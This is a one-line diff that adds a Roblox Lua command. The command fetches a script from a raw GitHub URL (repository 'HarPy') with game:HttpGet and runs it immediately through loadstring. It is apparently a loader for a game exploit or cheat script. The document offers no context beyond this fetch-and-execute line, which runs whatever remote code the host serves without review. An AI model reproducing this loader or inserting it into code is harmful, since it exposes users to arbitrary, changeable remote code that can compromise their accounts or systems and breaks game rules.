@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xShadow1234/HarPy/main/script.lua"))()
